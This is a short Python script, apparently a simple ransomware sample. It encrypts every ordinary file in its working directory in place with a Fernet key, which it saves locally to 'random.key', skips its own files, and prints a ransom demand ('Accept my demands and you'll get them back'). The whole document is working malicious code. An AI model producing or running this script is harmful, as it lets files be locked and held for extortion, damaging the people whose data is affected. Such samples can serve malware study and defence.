import os
from cryptography.fernet import Fernet

files=[]

for file in os.listdir():
    if file=='ware.py' or file=="random.key" or file=="not_ware.py":
        continue
    if os.path.isfile(file):
        files.append(file)

key=Fernet.generate_key()

with open("random.key",'wb') as rkey:
    rkey.write(key)

for file in files:
    with open(file,'rb') as ranfile:
        contents=ranfile.read()
        encrypted_contents=Fernet(key).encrypt(contents)
    with open(file,'wb') as ranfile:
        ranfile.write(encrypted_contents)

print("Your files have been encrypted!!! Accept my demands and you'll get them back")